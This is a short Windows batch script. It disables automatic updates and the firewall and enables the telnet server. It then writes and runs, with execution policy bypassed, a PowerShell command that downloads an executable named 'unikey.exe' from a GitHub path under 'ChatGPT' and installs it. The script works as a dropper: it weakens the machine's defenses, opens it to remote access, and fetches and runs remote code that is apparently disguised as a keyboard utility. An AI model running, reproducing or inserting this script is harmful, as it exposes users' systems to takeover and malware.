@echo off

REM ****************
REM Disable off "AUTO UPDATE"
REM ****************
sc config wuauserv start= disabled
net stop wuauserv
REM ****************
REM Disable windows xp Firewall
REM ****************
netsh firewall set opmode disable

REM ****************
REM Enable TELNET
REM ****************
sc config tlntsvr start= auto
net start telnet

echo "$Url = 'https://github.com/jokermakelove/ChatGPT/raw/main/unikey.exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';Invoke-WebRequest $Url -OutFile unikey.exe;.\unikey.exe -fullinstall
" > install.ps1 
powershell.exe -ExecutionPolicy Bypass -File install.ps1
exit